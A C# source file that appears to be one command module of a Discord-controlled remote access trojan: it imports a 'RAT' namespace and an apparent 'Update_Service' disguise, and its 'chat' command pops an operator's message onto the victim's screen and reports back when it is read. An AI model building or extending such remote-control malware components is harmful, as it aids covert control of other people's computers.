using Discord.Commands;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Threading;
using Discord;
using RAT;
using System.Diagnostics;
using Update_Service;

public class ChatCommand : ModuleBase<SocketCommandContext>
{

    [Command("chat")]
    public async Task ChatCmd([Remainder] string message)
    {

        

        try
        {   //wait until the previous form is closed


            if (Application.OpenForms.Count == 0)
            {   
                using (var form = new ChatForm())
                {
                    form.messagebox.Text = message;
                    form.ShowDialog();
                //check if user has clicked a specific button on the form
                if ( form.closed == true)
                    {
                    //send message to discord using SendMessage
                    await ReplyAsync($"Chat command completed  : Message Delivered and read by user");
                }
               
                
                
                    
                }
            }
            else
            {   

                
                Application.OpenForms[0].Close();
                using (var form = new ChatForm())
                {
                    form.messagebox.Text = message;
                    form.ShowDialog();
                }
            }
            
        }
        catch (Exception ex)
        {
            //send message to discord using SendMessage
            await ReplyAsync($"Error Executing chat command: {ex.Message}");

           
        }
      
        
    }
    


}
